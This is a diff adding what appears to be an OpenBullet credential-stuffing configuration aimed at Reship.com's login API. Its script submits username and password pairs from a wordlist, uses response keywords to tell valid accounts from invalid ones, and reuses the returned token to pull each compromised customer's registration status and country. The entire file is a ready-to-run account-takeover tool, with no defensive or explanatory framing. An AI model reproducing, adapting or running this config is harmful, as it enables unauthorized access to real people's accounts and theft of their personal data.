@@ -1,0 +1,69 @@
+[SETTINGS]
+{
+  "Name": "Reship.com",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-28T11:40:06.2001952+02:00",
+  "AdditionalInfo": "",
+  "Author": "Desme#5333",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#LOGIN REQUEST POST "https://www.reship.com/rest/api/1/auth" 
+  CONTENT "{\"emailAddress\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: www.reship.com" 
+  HEADER "Origin: https://www.reship.com" 
+  HEADER "Referer: https://www.reship.com/" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid password" 
+    KEY "Your email address was not found. Please register for a new account" 
+    KEY "success\":false" 
+  KEYCHAIN Success AND 
+    KEY "token" 
+    KEY "eyJ" 
+
+PARSE "<SOURCE>" JSON "token" -> VAR "TOK" 
+
+#GET REQUEST GET "https://www.reship.com/rest/api/1/customer" 
+  
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "Authorization: Bearer <TOK>" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: www.reship.com" 
+  HEADER "Referer: https://www.reship.com/" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
+
+PARSE "<SOURCE>" JSON "registrationStatus" -> CAP "Registration Status" 
+
+PARSE "<SOURCE>" JSON "country" -> CAP "Country" 
+
